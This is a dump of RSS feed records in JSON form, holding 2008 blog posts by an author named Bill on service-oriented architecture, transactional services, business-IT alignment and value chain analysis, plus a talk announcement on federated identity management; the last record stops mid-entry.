{"subscription":{"$wrap":"$oid","v":11},"link":"http://feedproxy.google.com/~r/BillPoolesCreativeAbrasion/~3/PqBnvSAxoN4/federated-identity-session-slides.html","title":"Federated Identity Session Slides","published":{"$wrap":"$date","v":1220587320002,"h":"2008-09-05T04:02:00.002Z"},"starred":false,"read":false,"content":"Thank you to all those who attended the<a href=\"http://perthdotnet.org/Default.aspx\">.NET Community of Practice</a>session on Thursday evening.  For those who missed it, you can download the presentation slides<a href=\"http://9ci9rq.bay.livefilestore.com/y1pgDyF4KbKkUxlDKB1lV01cR3dqeutzg19ykVe19g25sNMyE_h5efdBBA8C2ODwk7Pv4eFkv4zZIlfy0KGCt6Y6g/Federated%20Identity%20Management.pptx?download\">here</a>.<img src=\"http://feeds.feedburner.com/~r/BillPoolesCreativeAbrasion/~4/PqBnvSAxoN4\" height=\"1\" width=\"1\"/>","author":"Bill","_id":{"$wrap":"$oid","v":1252}}
{"k":"0000000084","o":"0000004440","v":"001"}
{"_id":1253,"_uid":1253,"_dt":1373742620971,"_s":"8159607e943ac77704d529f5feeb0fc2"}
{"subscription":{"$wrap":"$oid","v":11},"link":"http://feedproxy.google.com/~r/BillPoolesCreativeAbrasion/~3/LxKn8FQGXww/service-composition-continued.html","title":"Service Composition (continued...)","published":{"$wrap":"$date","v":1221632820002,"h":"2008-09-17T06:27:00.002Z"},"starred":false,"read":false,"content":"In my<a href=\"http://bill-poole.blogspot.com/2008/09/service-composition.html\">last post</a>we talked about service composition in SOA.  Miguel posted a good<a href=\"https://www.blogger.com/comment.g?blogID=4338956765494283322&postID=2153814277876223807\">question</a>about whether composition in SOA is analogous with composition in Component Oriented Programming.  This really got me to thinking about whether composition actually has any real meaning in SOA at all.<br /><br />One of the key differences between components in Component Oriented Programming and services in SOA is that components must be<i>instantiated</i>.  A client must instantiate a component before the component is used.  Furthermore, multiple instances of a component can and usually do exist at the same time.<br /><br />Composition makes a lot of sense in Component Oriented Programming because we have one or more child components supporting a parent component.  Every new instance of the parent component contains new instances of the child components.<br /><br />Without instancing, composition wouldn't really make a great deal of sense in Component Oriented Programming.  Just because a component uses or references another component, doesn't make those components a composite.  What makes a set of components a composite is the lifetime of the child components being indelibly tied to that of the parent component.  The children are created with the parent and destroyed when the parent is destroyed.  The children have no purpose other than to meet the needs of the parent.<br /><br />SOA is a different ballgame however.  There is only ever one and only one instance of every service.  All services for all intents and purposes are always running (except for the odd moments of downtime) until those services are retired.  So what is a composite in SOA terms?  If I have a service A which consumes services B and C, is A a composite of B and C?  I would say no.  Otherwise all services in our enterprise would simply one big composite.<br /><br />I would suggest that composition in SOA refers to the bringing together of lower level services in order to support one or more higher level services.  It seems we need to have services at different levels in order for composition to make sense in SOA.  So if services B and C are lower level services that form part of the implementation of service A, then I would say that services B and C have been composed to form service A.<br /><br />As I mentioned in my last post, with all the hype around<a href=\"http://bill-poole.blogspot.com/2008/05/layered-service-models-are-bad.html\">Layered Service Models</a>, where lower level services (like task and entity services) are composed to form higher level process services, we see service composition taking centre stage in SOA discussions far more than it really should.<br /><br />As I've<a href=\"http://bill-poole.blogspot.com/2008/04/soa-and-reuse.html\">previously discussed</a>, the type of reuse central to Layered Service Models (functional reuse as opposed to reuse of events) doesn't really work very well in practice.  Functions exposed at the service level generally are too coarsely grained to be reused in different contexts.  As such, the notion of having a registry of lower level services that can be composed together in support of higher level services is somewhat flawed.<br /><br />We<i>may</i>have lower level services such as integration services, UI services or B2B services that support a higher level business service, but those lower level services should not be reused between the higher level services.  As such, in this case the service composition is really just an implementation detail of the higher level services and as such not really architecturally noteworthy.<br /><br />So I say again, service composition in SOA is only really a noteworthy concept if you're pursuing a Layered Service Model which as I've said before is not ideal.<img src=\"http://feeds.feedburner.com/~r/BillPoolesCreativeAbrasion/~4/LxKn8FQGXww\" height=\"1\" width=\"1\"/>","author":"Bill","_id":{"$wrap":"$oid","v":1253}}
{"k":"0000000084","o":"0000004380","v":"001"}
{"_id":1254,"_uid":1254,"_dt":1373742620972,"_s":"6c43f092aefadfafc9d34285fdcce907"}
{"subscription":{"$wrap":"$oid","v":11},"link":"http://feedproxy.google.com/~r/BillPoolesCreativeAbrasion/~3/719ViZa3CHU/service-composition.html","title":"Service Composition","published":{"$wrap":"$date","v":1221208260003,"h":"2008-09-12T08:31:00.003Z"},"starred":false,"read":false,"content":"Quite often we hear of service composition as one of the key benefits of the service oriented style of architecture.  With service composition, we are referring to the creation of new services from wiring up of existing services in new ways to deliver new value.<br /><br />According to the standard reading material, service composition is best achieved through<i>orchestration</i>.  This is usually achieved through the use of middleware such as an ESB or integration broker.  A workflow orchestrates the invocations of a number of services in order to achieve some particular outcome.<br /><br />As such, we find that a service may comprise some of its own logic (including the orchestration logic), as well as a number of lower level services.<br /><br />This concept of service composition is central to the<a href=\"http://bill-poole.blogspot.com/2008/05/layered-service-models-are-bad.html\">Layered Service Model</a>where lower level task and entity services are composed into higher level process services.  As you will have gleaned from my previous posts on the topic, I'm not a supporter of the Layered Service Model approach.  One of the issues of this approach is that lower level services are reused by many higher level services, resulting in high coupling between those higher level services.<br /><br />In the past, I have highly recommended that people pursue what I call a<a href=\"http://bill-poole.blogspot.com/2008/05/layered-service-models-are-bad_20.html\">Self-Contained Process-Centric Service Model</a>.  Here, services are centred around autonomous business functions such as Sales, Marketing and Billing.  What I probably didn't emphasise about this approach however is that it refers only to the top-level service model.  Each business service<i>may</i>be composed of lower level services.<br /><br />Note that these lower level services are not<i>business services</i>.  They are services that serve a particular function in support of the business service.  They are an implementation detail of the business service.  In fact, they are actually really just distributed components or integration points.  However if the means of communication with the distributed component or integration point is the exchange of messages via endpoints in conformance with a service contract, then we technically have a service by the strict definition of SOA.<br /><br />In a green fields implementation where the software supporting each business service is built from scratch, there may be no lower level services involved.  That is, there is no service composition.  Alternatively, the service software may be implemented with a smart client application that interacts with some back end components via the exchange of messages in conformance to a service contract.  Thus, those back end components technically expose a service to the smart client application.<br /><br />Say in support of this business service, the back end components also interact with a Web service provided by another organisation. Now we have another service added to the mix.  Here we can see services being composed in support of the larger business service.<br /><br />Where a business service is supported by a number of legacy applications we see even more composition.  When the business service receives a message, it must invoke one or more of these legacy applications appropriately.  This<i>may</i>be achieved by invoking Web services exposed by these applications, thus constituting further service composition.<br /><br />So we see that services certainly can be composed in support of larger services.  However I would hesitate to name this as a benefit of the SOA style of architecture.  It is merely an implementation choice of any given service.  Service composition has only come to be viewed by many as a key benefit of SOA due to the reuse promised (falsely in my opinion) by the Layered Service Model approach.<img src=\"http://feeds.feedburner.com/~r/BillPoolesCreativeAbrasion/~4/719ViZa3CHU\" height=\"1\" width=\"1\"/>","author":"Bill","_id":{"$wrap":"$oid","v":1254}}
{"k":"0000000084","o":"0000003142","v":"001"}
{"_id":1255,"_uid":1255,"_dt":1373742620972,"_s":"9688cfca767c6504fc5872e743000fd0"}
{"subscription":{"$wrap":"$oid","v":11},"link":"http://feedproxy.google.com/~r/BillPoolesCreativeAbrasion/~3/COA5WXccvL8/soa-and-platform-independence.html","title":"SOA and Platform Independence","published":{"$wrap":"$date","v":1219151820003,"h":"2008-08-19T13:17:00.003Z"},"starred":false,"read":false,"content":"Quite often I hear platform independence as not only a key benefit of SOA, but a defining characteristic.  Let me begin by saying this is simply not the case.  Platform independence in the context of SOA has two connotations:<br /><br />1. Services can be hosted on any platform (Windows, Linux, .NET, Java, etc)<br />2. Services are interoperable regardless of the platforms on which they are hosted<br /><br />Firstly, let us examine what a service is from a technical standpoint.  A service is an autonomous coarse grained unit of logic which external parties can communicate by way of exchanging explicitly defined messages via its endpoints.  The messages and endpoints are described by the service contract.  Consumers must conform to policies stipulated by a service provider in order to consume the service.<br /><br />Based on the above definition, any platform that can host a process that can exchange messages over a network is capable of hosting a service.  This is not a miracle of SOA, it is simply the miracle of distributed computing which was around long before the emergence of SOA.<br /><br />The second thing to note about the above definition is that it does not mandate any specific<i>transport</i>or<i>encoding</i>of messages.  Messages do<i>not</i>have to be encoded in XML.  They do<i>not</i>have to be transported over HTTP.  Service contracts do<i>not</i>have to be specified in WSDL.  Services<i>do not have to be natively interoperable</i>.<br /><br />Now it is true that Web service technologies greatly improve service interoperability between platforms.  But services in our SOA do not have to be Web services.  Even Web services by today's definition do not mandate that messages are transported over HTTP.  It is quite acceptable for a Web service to be exposed over a JMS or MSMQ transport.  JMS and MSMQ are<i>not</i>natively interoperable.<br /><br />It is also true that an intermediary such as an ESB can provide protocol translation which can make services that exchange messages with incompatible transports and encodings interoperable.  But again, an ESB is<i>not</i>a prerequisite for SOA.<br /><br />I guess the commonly held view that SOA and platform independence go hand in hand has emerged from the association between SOA and Web services.  But once again just to set the record straight, SOA does not mandate platform independence.<br /><br />SOA<i>does</i>however mandate that implementation details of a service are encapsulated behind the service contract.  As such, SOA certainly makes platform independence easier to achieve.  We just need to overcome any incompatibilities in message transport and encoding.<img src=\"http://feeds.feedburner.com/~r/BillPoolesCreativeAbrasion/~4/COA5WXccvL8\" height=\"1\" width=\"1\"/>","author":"Bill","_id":{"$wrap":"$oid","v":1255}}
{"k":"0000000084","o":"0000001989","v":"001"}
{"_id":1256,"_uid":1256,"_dt":1373742620972,"_s":"17d0046f9fa315b0712b385e6b138041"}
{"subscription":{"$wrap":"$oid","v":11},"link":"http://feedproxy.google.com/~r/BillPoolesCreativeAbrasion/~3/UHbMGQ8vm6k/federated-identity-management-in.html","title":"Federated Identity Management in a Service Oriented World","published":{"$wrap":"$date","v":1219154940003,"h":"2008-08-19T14:09:00.003Z"},"starred":false,"read":false,"content":"Join me as I present to the<a href=\"http://perthdotnet.org/Default.aspx\">Perth .NET Community of Practice</a>on Federated Identity Management in a Service Oriented World.  The session synopsis is below:<br /><br /><i>Gone are the good old days of siloed applications that identify users with a simple username/password combination stored in the application database.  In today’s world of Internet based e-commerce where secure transactions occur over insecure open networks and in a service oriented world of composite applications where identity must be shared between systems hosted by different organisations on disparate platforms; in a world where increasing numbers of businesses are turning to hosting their applications in the cloud, and where users from partner organisations need to be securely granted access to enterprise resources, architects are turning to an ever increasingly complex array of security solutions to solve their identity woes.<br /><br />How do we as mere mortals make sense of PKI, Kerberos, SAML, and a plethora of WS-* standards aimed at addressing these concerns?  This session will provide a clear and practical description of how to apply today’s security technologies in order to effectively manage and share identity across applications, service and organisational boundaries.</i><br /><br />Details below:<br /><br />DATE: Thursday, September 4, 5:30pm<br />VENUE: Excom, Level 2, 23 Barrack Street, Perth<br />COST: Free. All Welcome<img src=\"http://feeds.feedburner.com/~r/BillPoolesCreativeAbrasion/~4/UHbMGQ8vm6k\" height=\"1\" width=\"1\"/>","author":"Bill","_id":{"$wrap":"$oid","v":1256}}
{"k":"0000000084","o":"0000002935","v":"001"}
{"_id":1257,"_uid":1257,"_dt":1373742620972,"_s":"fceec5626740624ddb983dac91222d33"}
{"subscription":{"$wrap":"$oid","v":11},"link":"http://feedproxy.google.com/~r/BillPoolesCreativeAbrasion/~3/Isfq9MlkoVg/transactional-services-continued.html","title":"Transactional Services (continued...)","published":{"$wrap":"$date","v":1215330300003,"h":"2008-07-06T07:45:00.003Z"},"starred":false,"read":false,"content":"In my<a href=\"http://bill-poole.blogspot.com/2008/06/transactional-services.html\">last post</a>we discussed the concept of transactional services and how they ensure business actions can be executed atomically within a service by enrolling local queue and/or topic resources into a distributed transaction. What I did not explain however is<i>why</i>queues and topics are essential for supporting transactional services.<br /><br />Queues and topics are necessary to support transactional services because that both types of transports queue messages while they await delivery.  Although the transport may not store messages durably, they are still stored somewhere until they are delivered.  Neither the sender nor receiver holds onto the message during its transport.<br /><br />So, would it be possible to implement transactional services using a non-queued transport?  For example, let us assume we wanted to use WS-AtomicTransaction (WS-AT) over an HTTP transport.  As it turns out, it is not possible to achieve this without spanning the distributed transaction across your service boundaries.  As we all know, spanning transactions across service boundaries is not a good idea as it hurts performance and reliability.<br /><br />The reason for this is that with queued transports, messages are delivered to the receiver using a pull based mechanism. Messages are first pushed to the receiving queue, after which they wait to be read by the receiver at a later time.  This means that the sending service can complete and commit its transaction without concerning itself with the success or failure of the receiving service.<br /><br />Moreover, queued transports will cache the outbound message locally making the availability of the receiver irrelevant in committing the local transaction.  Without this mechanism for storing messages as they are transported between services, the successful transport of the message as well as the successful execution of the operation at the receiver become relevant as to whether the local transaction can be committed at the sender.<br /><br />Consequently, the sender must<i>wait</i>for a response from the receiver before committing the transaction - during which time local resources will likely be locked as part of the local transaction.<br /><br />So although transactional services are an incredibly powerful tool in service design, they do unfortunately require the use of a queued transport.<img src=\"http://feeds.feedburner.com/~r/BillPoolesCreativeAbrasion/~4/Isfq9MlkoVg\" height=\"1\" width=\"1\"/>","author":"Bill","_id":{"$wrap":"$oid","v":1257}}
{"k":"0000000084","o":"0000008083","v":"001"}
{"_id":1258,"_uid":1258,"_dt":1373742620972,"_s":"dfcd835af219f807ea70326663221038"}
{"subscription":{"$wrap":"$oid","v":11},"link":"http://feedproxy.google.com/~r/BillPoolesCreativeAbrasion/~3/94uv3XlhB7Q/business-it-alignment.html","title":"Business-IT Alignment","published":{"$wrap":"$date","v":1218963060018,"h":"2008-08-17T08:51:00.018Z"},"starred":false,"read":false,"content":"<p>We hear the term (or should I call it buzz phrase?), business-IT alignment thrown around a lot these days - especially in SOA and Enterprise Architecture circles.  In fact business-IT alignment is commonly named as one of the key benefits of SOA (along with business agility, which is something I'll discuss in more detail in a future post).</p><p>So what is business-IT alignment, and why is it important?  What is all the fuss about?  Simply put, business-IT alignment is the extent to which<i>IT investments</i>are made in accordance with<i>business strategy</i>.  In the other direction, it is also the extent to which new technologies can be harnessed in order to<i>gain competitive advantage</i>.  Furthermore, it is also the extent to which the enterprise IT architecture aligns with and supports the enterprise business architecture.</p><p>A model for business-IT alignment is illustrated below.</p><br /><a href=\"http://2.bp.blogspot.com/_Ulehi1qz3j0/SKfm-y9Vt8I/AAAAAAAAAEE/a-kc1EF17P0/s1600-h/Business-IT+Alignment.png\"><img style=\"display:block; margin:0px auto 10px; text-align:center;cursor:pointer; cursor:hand;\" src=\"http://2.bp.blogspot.com/_Ulehi1qz3j0/SKfm-y9Vt8I/AAAAAAAAAEE/a-kc1EF17P0/s400/Business-IT+Alignment.png\" border=\"0\" alt=\"\"id=\"BLOGGER_PHOTO_ID_5235407058346817474\" /></a><br /><p>The elements of this model are:</p><p><b>Business Strategy</b></p><p>Johnson and Scholes in their book<a href=\"http://www.amazon.co.uk/exec/obidos/ASIN/0273651129/tutor2u00\">Exploring Corporate Strategy</a>define strategy as \"the<b>direction</b>and<b>scope</b>of an organisation over the<b>long-term</b>: which achieves<b>advantage</b>for the organisation through its configuration of<b>resources</b>within a challenging<b>environment</b>, to meet the needs of<b>markets</b>and to fulfil<b>stakeholder</b>expectations.</p><p>Expanding on this, a business strategy identifies:<ul><li>The long term strategic objectives of the business</li><li>The markets in which the business should compete and the business functions required to do so</li><li>The ways in which those business functions can be performed in such a way to gain competitive advantage</li><li>The resources (people, skills, IP, technology, finance, etc) necessary in order to support the business functions and compete effectively</li><li>The external/environmental factors that influence the business's ability to compete effectively</li><li>The concerns, objectives and expectations of the various stakeholders (both internal and external) that have the power to influence the success of the business</li></ul></p><p><b>IT Strategy</b></p><p>As with business strategy, IT strategy involves identifying the long term view of the IT function of the business.  It identifies the<b>direction</b>and<b>scope</b>of the IT function over the long term in order to achieve<b>advantage</b>for the organisation through its configuration of<b>IT resources</b>within a challenging<b>environment</b>to meet the needs of<b>the business</b>and to fulfil<b>stakeholder</b>expectations.</p><p><b>Business Architecture</b></p><p>Business Architecture is the process of defining the business functions, processes, capabilities, services, roles and reporting relationships that make up a business.  Here, we are referring to Business Architecture applied at the enterprise level, rather than the solution level.</p><p><b>IT Architecture</b></p><p>IT Architecture is often expressed as Information Architecture, Application Architecture and Technology Architecture.  I'll describe these architecture domains in more detail in future posts.  In short, IT Architecture is the process of organising IT and information assets to support the business architecture and IT strategy.</p><br /><br /><p>Businesses that have strong business-IT alignment tend to have the following in common:<ul><li>IT investments can be directly linked to specific strategic business objectives.</li><li>The business drives all major IT initiatives in conjunction and cooperation with IT.</li><li>The business has an explicitly defined IT strategy which is directly linked to the business strategy.</li><li>IT is generally seen as an investment rather than an expense.</li><li>IT has direct representation in the executive leadership team and as such is present during business planning and strategy sessions.</li></ul></p><p>Most businesses today leverage IT only as a support mechanism.  IT is viewed as a cost centre - a means to an end, rather than a strategy enabler.  This is evidenced by the fact that many organisations do not have IT representation in the executive leadership team.</p><p>We see this commonly where the CFO belongs to the executive leadership team, and the CIO reports to the CFO.  In some organisations, the IT function is buried even further down in the hierarchy.  Business strategy is formulated without input from or support of IT.  IT is then involved as late as possible in the process only as a means of<i>executing</i>business strategy, rather than being involved in its<i>formulation</i>.</p><p>As a result of this ethos, IT has little to no visibility of the business strategy.  That is, IT has no visibility of the long term business plan or objectives.  Consequently, IT is limited to adding value<i>reactively</i>rather than<i>proactively</i>.  The IT function is directed to deliver systems with specific<i>tactical</i>scope, which although being part of a broader strategic vision doesn't give IT any visibility of that vision.</p><p>This results in the delivery of IT solutions that meet all the tactical requirements, but do not necessarily align with the long term strategic objectives of the organisation.</p><p>Furthermore, many organisations do not engage in Enterprise Business Architecture practices.  As such, there is no enterprise-wide functional view of the business.  Usually, there is only a structural view in the form of an organisation chart.  We usually find various business processes that have been documented with varying levels of detail, scope and accuracy, but no view as to how those processes fit into the bigger picture or how those processes support the business strategy.</p><p>As such, IT does not have the necessary information in order to formulate an effective enterprise IT architecture.  This only further forces IT down the road of acting tactically rather than strategically.  If IT has no view of the enterprise business architecture, then it cannot structure its IT assets optimally so that IT systems have high cohesion and loose coupling.</p><p>A result of delivering IT systems with only a tactical focus over an extended period of time is an enterprise IT architecture that is an unstructured mess with duplication of functionality (often manifested as many applications performing similar functions across the enterprise), suboptimal distribution of data, data locked in application silos, large numbers of complex and brittle interdependencies between systems, and poor performance and reliability of business critical IT systems.</p><p>Consequently we see an ever increasing percentage of IT budget being spent on maintaining the status quo, rather than being spent on investing in new capabilities that deliver new value to the enterprise.  Clearly this position is not sustainable in a competitive market.</p><p>One of the key ingredients in achieving business-IT alignment is an Enterprise Architecture program.  Businesses are already seeing significant returns from this investment, and time is running out for businesses that have not yet commenced engaging in this practice.</p><img src=\"http://feeds.feedburner.com/~r/BillPoolesCreativeAbrasion/~4/94uv3XlhB7Q\" height=\"1\" width=\"1\"/>","author":"Bill","_id":{"$wrap":"$oid","v":1258}}
{"k":"0000000084","o":"0000003478","v":"001"}
{"_id":1259,"_uid":1259,"_dt":1373742620972,"_s":"6deec3081d13920ec50af54fd978040d"}
{"subscription":{"$wrap":"$oid","v":11},"link":"http://feedproxy.google.com/~r/BillPoolesCreativeAbrasion/~3/jQYtwn0ah3g/consumer-driven-contracts.html","title":"Consumer Driven Contracts","published":{"$wrap":"$date","v":1217951340004,"h":"2008-08-05T15:49:00.004Z"},"starred":false,"read":false,"content":"A while back a reader sent me an email asking about<i>consumer driven contracts</i>and how they fit into my stance on SOA.  I'd intended to share my thoughts on the approach with the rest of my readers but alas it slipped my mind.  Better late than never though, so I thought I'd take the opportunity to discuss the concept now.<br /><br />Consumer driven contracts as an approach is intended to provide inputs into the service provider's contract design to ensure relevance, as well as provide constraints on how a service provider's contract can evolve over time such that compatibility is maintained with consumers.<br /><br />However the intention should always be that the service provider contract evolves in such a way as to better express the concepts of the provider.  We don't want to reduce the semantic fidelity of communications with our services.<br /><br />I would say that as long as you're sticking mainly to publish-subscribe messaging (that is, avoiding command messages), then the needs of the consumer are considerably less relevant.  Consumers are only<i>informed</i>of events as they happen.  Command messages produce a subtle form of coupling where the service consumer<i>instructs</i>the service provider what to do.<br /><br />Services that publish events do not prescribe or assume what subscribed services will do (if anything) once a notification message is received.  An event message describes only an event that occurred within a service.  The subscribers should really have no influence on this.  As such, they should not be influencing the schema of the event messages published by the service provider.<br /><br />So when using publish-subscribe messaging, I would suggest that consumer contracts are useful only in providing constraints on what can be changed in the service provider's contract in order to maintain compatibility with its consumers.<br /><br />That being said, service contracts tend to be quite stable with<a href=\"http://bill-poole.blogspot.com/2008/05/layered-service-models-are-bad_20.html\">process-centric self-contained service models</a>- so I've not personally found consumer driven contracts worth the effort.<br /><br />Consumer driven contracts really come into their own with data-centric contracts and centralised data architectures.  When we always need to go and get our data from elsewhere, and all our service consumers use that data for different purposes, consumers have a substantial dependency on the service provider's schema.  They will likely need to influence the provider's schema quite regularly.  That in turn will affect the other consumers.<br /><br />This is yet another reason to pursue process-centric service contracts with decentralised data architectures.  It keeps your service contracts stable by virtue of minimising dependencies between service providers and consumers.  You can read more about service contract stability<a href=\"http://bill-poole.blogspot.com/2008/07/service-contract-stability.html\">here</a>.<img src=\"http://feeds.feedburner.com/~r/BillPoolesCreativeAbrasion/~4/jQYtwn0ah3g\" height=\"1\" width=\"1\"/>","author":"Bill","_id":{"$wrap":"$oid","v":1259}}
{"k":"0000000084","o":"0000003791","v":"001"}
{"_id":1260,"_uid":1260,"_dt":1373742620972,"_s":"7a79c53d57e7ce46799b5a6192433185"}
{"subscription":{"$wrap":"$oid","v":11},"link":"http://feedproxy.google.com/~r/BillPoolesCreativeAbrasion/~3/IBou74EiLjA/implementing-business-services.html","title":"Implementing Business Services","published":{"$wrap":"$date","v":1215936000004,"h":"2008-07-13T08:00:00.004Z"},"starred":false,"read":false,"content":"In my<a href=\"http://bill-poole.blogspot.com/2008/07/business-capabilities.html\">last post</a>we discussed business capabilities and how they form the basis of how we identify candidate business services.  But what is the physical manifestation of a business service?  Once we've determined the boundaries of our business services and their responsibilities, how do we go about implementing them?<br /><br />A business service is realised as a set of business processes and business rules, the people that perform those processes, the applications leveraged by those people in support of their roles in those business processes, the information leveraged by decision makers within those business processes, as well as the information as inputs and outputs of those processes, the semantics and structure of data held within the service, and the technology platforms on which the IT systems supporting the business service execute.<br /><br />Business processes in different services coordinate their activities via business events.  These business events define the interface (or service contracts) between business services.<br /><br />A business service may contain no IT systems whatsoever.  Where there<i>are</i>IT systems supporting a business service, they may not at all support the interface with the rest of the business.  A business event may be realised by a simple telephone call or a memo sent between people participating in different business services.<br /><br />Where IT systems<i>do</i>support the interface with the rest of the business, we have software components in different business services exchanging data.  In the SOA style of architecture, this data exchange is performed by way of exchanging explicitly defined messages in conformance with a service contract.<br /><br />Where we design our software components around business services (rather than taking the<a href=\"http://bill-poole.blogspot.com/2008/05/jbows-is-bad.html\">JBOWS</a>,<a href=\"http://bill-poole.blogspot.com/2008/04/web-services-integration.html\">Service Oriented Integration</a>or<a href=\"http://bill-poole.blogspot.com/2008/05/layered-service-models-are-bad.html\">Layered service Model</a>approach), business events are realised as event messages published onto our service bus.  The technical service contract then consists of the schema of the messages published by the service onto one or more topics.<br /><br />Inside the boundary of our business service, we may have one or more software components that exchange data via messages.  For example, a smart client application supporting a business service may interface with one or more back end components using SOAP based messages.<br /><br />These interactions that occur<i>behind</i>the service boundary are an implementation detail of the service itself.  These design aspects are local to the business service and as such do not influence the business service contract or play a part in the broader architecture.<br /><br />In conclusion, the way in which business services are manifested in terms of IT systems depends on the flavour of SOA chosen. By aligning our technical service contracts with business services and business events we achieve considerably better structural alignment between the business and the IT systems that support it.<img src=\"http://feeds.feedburner.com/~r/BillPoolesCreativeAbrasion/~4/IBou74EiLjA\" height=\"1\" width=\"1\"/>","author":"Bill","_id":{"$wrap":"$oid","v":1260}}
{"k":"0000000084","o":"0000009707","v":"001"}
{"_id":1261,"_uid":1261,"_dt":1373742620972,"_s":"315415685b7e692aa10ed83fe0530cdb"}
{"subscription":{"$wrap":"$oid","v":11},"link":"http://feedproxy.google.com/~r/BillPoolesCreativeAbrasion/~3/9G_jUw0pPB4/value-chain-analysis.html","title":"Value Chain Analysis","published":{"$wrap":"$date","v":1217514480006,"h":"2008-07-31T14:28:00.006Z"},"starred":false,"read":false,"content":"Recently we<a href=\"http://bill-poole.blogspot.com/2008/07/business-capabilities.html\">discussed</a>how business services are realised in terms of business process, people, information, data, applications, and technology.  A business service can be seen as a cohesive business capability that does not share process, data or business rules with any other capability.<br /><br />The interface (or service contract) between business services is expressed in terms of business events.  Business services are not dependent on how other business services are fulfilled, only the business events they raise.  Consequently, the business architecture description is very stable.  We can update process implementations without impacting any other processes so long as the high level business events are unaffected.<br /><br />Our technical service components are then aligned with our business services and business events, extending this stability and loose coupling to our IT architecture.<br /><br />So business capabilities are the key ingredient in determining our service model.  But how do we go about identifying business capabilities?  Do we simply think about what a business does at a high level and decompose?  Or is there a better way?<br /><br />A while back<a href=\"http://blogs.msdn.com/nickmalik/\">Nick Malik</a>wrote about the<a href=\"http://blogs.msdn.com/nickmalik/archive/2008/04/24/merging-capability-modeling-with-process-modeling.aspx\">relationship between capability modelling and process modelling</a>.  He posed the question as to whether these two approaches conflict, or if they are in fact complimentary.  If you've been reading my recent posts on the matter you would probably guess that I feel the two approaches are very much complimentary.<br /><br />Nick suggests that there are two main approaches one may take in identifying business capabilities.  One is process centric where capabilities are defined around process areas within an organisation.  The other suggested approach is to align business capabilities with organisational structure.  In this approach, capabilities mirror the structure of a business (such as divisions, departments, business units and teams), rather than its processes.<br /><br />As you've probably gleaned from my previous posts on business architecture modelling, I very much favour the process centric approach.  In fact, the premise of modelling business services around capabilities<i>relies</i>on the capabilities being process-centric.  As I mentioned above, the interface between business services is expressed in terms of business events.  Business events are raised by business processes.<br /><br />If a single business process were to feature in multiple capabilities (as would be the case if we modelled our capabilities around organisational structure rather than process areas), then multiple capabilities would expose the same business events.  Moreover, updating a single business process would potentially involve updating the implementation of multiple business capabilities.<br /><br />So when using business capabilities as a means of identifying candidate business services we must take a process-centric approach.  How then do we produce a process-centric capability model of our enterprise?  The answer lies with<a href=\"http://en.wikipedia.org/wiki/Value_chain\">Value Chain Analysis</a>.<br /><br />Value Chain Analysis involves identifying the top level process areas (or functions) of an organisation and mapping them as a value chain.  The value chain illustrates the series of top-level processes an organisation uses to take inputs from the market, transform those inputs, and then deliver value added products and/or services back to the market at a profit.  These processes are synergistic in nature.  The total cost of these processes is less than the value added by the organisation, thus justifying the profit margin.<br /><br />A value chain is modelled in terms of primary and support activities.  Primary activities are those that feature in the value chain itself.  They are the processes responsible for engaging with the market and directly transforming inputs into outputs.  Support activities support the primary activities.<br /><br />The value chain for a typical insurance organisation is illustrated below.<br /><br /><a href=\"http://bp2.blogger.com/_Ulehi1qz3j0/SJHNuPbDHJI/AAAAAAAAADc/uNNabMQQBM0/s1600-h/Insurance+Value+Chain.png\"><img style=\"display:block; margin:0px auto 10px; text-align:center;cursor:pointer; cursor:hand;\" src=\"http://bp2.blogger.com/_Ulehi1qz3j0/SJHNuPbDHJI/AAAAAAAAADc/uNNabMQQBM0/s400/Insurance+Value+Chain.png\" border=\"0\" alt=\"\"id=\"BLOGGER_PHOTO_ID_5229186836651515026\" /></a><br />There are seven primary and seven support activities in the above example.  Each activity contains a number of processes that support the activity.  Note that not<i>all</i>processes within a primary activity necessarily directly contribute to the value chain.  A primary activity must only contain at least one process that contributes to the value chain.<br /><br />An organisation may also have multiple value chains.  Multiple value chains may arise where the organisation serves more than one market.  Different markets may be served with fundamentally different processes within the organisation.<br /><br />For example if we were to take two companies supplying completely different products to completely different markets and a merger were to occur, then we would end up with one organisation with two value chains.  Support activities in one value chain may be primary activities in another.<br /><br />The value chain depicts an end-to-end process that executes left to right.  In the above example, Marketing sits at the beginning of the value chain because the business must determine what products it is going to offer before doing anything else.  After determining the product mix and pricing strategy, Risk Modelling must occur to determine the means by which premium will be calculated for each product.<br /><br />Armed with this information, actual pricing (rate charts) can be determined for each product.  Note that this occurs in the Marketing activity.  So we have transitioned<i>back</i>from Risk Modelling to Marketing.  Feedback loops are always going to occur within value chains.  The point is that the first process that had to occur (determining the product mix) lay within the Marketing activity, and thus Marketing sits before Risk Modelling in the value chain.<br /><br />Now the business is in a position to start selling its insurance products to customers.  This is the Sales activity.  The Sales activity involves quotations, proposals, risk assessment and commission calculation.  Commissions are paid to all parties involved in the distribution channel.<br /><br />Once a policy has been sold, it must be written.  This is a Policy Administration activity.  Once the policy has been written, the customer must then be billed.  Once the premium has been paid by the customer, the customer<i>may</i>at some point register a claim.  Note that this activity is optional.  A customer may<i>never</i>register a claim.  The Customer Service function is then responsible for serving the needs of the customer until his or her policy expires.<br /><br />A value chain gives us a<i>functional model</i>of our organisation.  That is, it models the functions an organisation performs without consideration for<i>how</i>they are performed.  This is what gives the model its stability.<br /><br />Later on as we drill down into the lower level processes supporting each activity in the value chain, we start getting into the implementation details.  We start modelling the exact sequence of actions performed and the roles that are responsible for those actions.<br /><br />It is through defining these lower level processes that we in fact are able to define the roles within the organisation and the responsibilities and KPIs for each role.  Armed with this, we are then in a position to determine the organisational structure - that is, the reporting relationships between the defined roles.<br /><br />This is illustrated below.<br /><br /><a href=\"http://bp2.blogger.com/_Ulehi1qz3j0/SJHUQCXnJ5I/AAAAAAAAADs/4GMAXXjxATE/s1600-h/Organisational+Structure+%26+Design.png\"><img style=\"display:block; margin:0px auto 10px; text-align:center;cursor:pointer; cursor:hand;\" src=\"http://bp2.blogger.com/_Ulehi1qz3j0/SJHUQCXnJ5I/AAAAAAAAADs/4GMAXXjxATE/s400/Organisational+Structure+%26+Design.png\" border=\"0\" alt=\"\"id=\"BLOGGER_PHOTO_ID_5229194014332757906\" /></a><br />As lower level processes change within an organisation, so may the roles and responsibilities and by extension the organisational structure.  This is further evidence of why we should model capabilities around business functions rather than organisational structure.  It provides a considerably more stable model.<br /><br />This activity of modelling the value chain has forced us to consider the entire business in a holistic and process centric way.  As such it is an excellent tool for identifying our top level process centric business capabilities that we can then use to define our business service model.<img src=\"http://feeds.feedburner.com/~r/BillPoolesCreativeAbrasion/~4/9G_jUw0pPB4\" height=\"1\" 